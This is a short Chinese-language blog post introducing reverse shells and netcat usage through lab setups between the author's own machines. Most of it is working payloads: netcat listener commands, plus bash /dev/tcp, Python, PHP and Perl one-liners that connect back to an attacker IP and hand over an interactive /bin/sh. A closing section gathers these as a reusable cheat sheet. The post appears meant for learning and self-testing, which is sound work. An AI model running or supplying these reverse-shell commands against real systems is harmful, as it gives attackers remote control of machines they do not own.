---
title: 反弹shell入门
layout: post
categories: web安全
tags: shell
---

主要就是通过几个实例来简单介绍和演示一下反弹 shell，以及 nc(Netcat)的使用。后面顺便有一个 bugku 上的题目这里直接给出解答。

<!--more-->

## 0x01 实验环境

### 1.第一种情况

靶机: Mac

攻击机: 阿里云上的一台机器(Ubuntu)

首先在阿里云上监听端口:

```
nc -lvv 8888
```

然后在目标机器 Mac 上反弹 shell：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机的 IP",被监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

然后你在攻击机上就接手了目标机器



### 2.第二种情况

靶机: Mac

攻击机：win7

在win7上监听端口

[nc.exe](https://github.com/diegocr/netcat)

```
nc.exe -l -vv -p 8888
```

在 Mac 上反弹shell

```
php -r '$sock=fsockopen("192.168.1.102",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```



### 3.第三种情况

靶机: kali

攻击机: Mac

在 Mac 上监听端口

```
nc -l -vv -p  8888
```

在 kali 上反弹shell

```
/bin/bash -i >& /dev/tcp/192.168.1.101/8888 0>&1
```



**注意:**

我之前试图在阿里云上反弹 shell 到 Mac 上发现一直失败，然后是 `ping` 了一下，发现 `ping` 不通，这里可能跟学校的网有点关系，所以就没有做了。后来为了将 Mac 作为攻击机，我就在虚拟机上做了。



## 0x02 总结

实践几个常用的，分别用bash/sh，perl，python，php来实现；

```
/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

/bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

参考：[https://www.bodkin.ren/index.php/archives/298/](https://www.bodkin.ren/index.php/archives/298/)











